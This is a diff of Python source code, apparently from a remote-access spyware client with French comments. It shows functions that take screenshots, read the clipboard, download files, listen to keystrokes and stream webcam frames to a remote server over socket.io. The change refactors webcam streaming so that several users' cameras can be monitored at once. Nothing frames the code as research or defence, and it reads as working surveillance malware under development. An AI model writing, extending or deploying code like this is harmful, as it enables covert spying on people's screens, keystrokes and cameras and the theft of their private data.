@@ -1,18 +1,18 @@
 import base64
-import cv2
 import io
+import os
 import threading
 import time
+import wave
+import webbrowser
 
+import cv2
 import keyboard
 import pyaudio
 import pyautogui
 import pyperclip
-import webbrowser
 from PIL import Image
 from pynput.keyboard import Key, Listener
-import os
-import wave
 
 current_keys = []
 trigger_words = {
@@ -22,8 +22,7 @@ trigger_words = {
 }
 page_opened_recently = False
 
-# Ajoutez cette variable globale
-stop_streaming_event = threading.Event()
+stop_streaming_events = {}  # Dictionnaire pour gérer les événements d'arrêt pour chaque utilisateur
 
 
 def take_and_send_screenshot(callback, user_id):
@@ -112,13 +111,13 @@ def get_clipboard_content(callback, user_id=None):
         print(f"Échec de la récupération du clipboard: {e}")
 
 
-def gen_frames(sio):
+def gen_frames(sio, user_id):
     try:
-        camera = cv2.VideoCapture(0, cv2.CAP_ANY)
+        camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # Utilisez DirectShow au lieu de MSMF
         if not camera.isOpened():
             raise ValueError("Failed to open webcam")
 
-        while not stop_streaming_event.is_set():
+        while not stop_streaming_events[user_id].is_set():
             success, frame = camera.read()
             if not success:
                 print("Failed to read frame from webcam")
@@ -129,7 +128,7 @@ def gen_frames(sio):
                     print("Failed to encode frame")
                     continue
                 frame_bytes = base64.b64encode(buffer)
-                sio.emit('webcam_response', {'data': frame_bytes.decode()})
+                sio.emit('webcam_response', {'data': frame_bytes.decode(), 'user_id': user_id})
     except Exception as e:
         print(f"Exception occurred in gen_frames: {e}")
     finally:
@@ -138,15 +137,16 @@ def gen_frames(sio):
         cv2.destroyAllWindows()
 
 
-def start_stream(sio):
-    global stop_streaming_event
-    stop_streaming_event.clear()
-    threading.Thread(target=gen_frames, args=(sio,)).start()
+def start_stream(sio, user_id):
+    global stop_streaming_events
+    stop_streaming_events[user_id] = threading.Event()
+    threading.Thread(target=gen_frames, args=(sio, user_id)).start()
 
 
-def stop_stream():
-    global stop_streaming_event
-    stop_streaming_event.set()
+def stop_stream(user_id):
+    global stop_streaming_events
+    if user_id in stop_streaming_events:
+        stop_streaming_events[user_id].set()
 
 
 def download_file(callback, file_path, user_id):
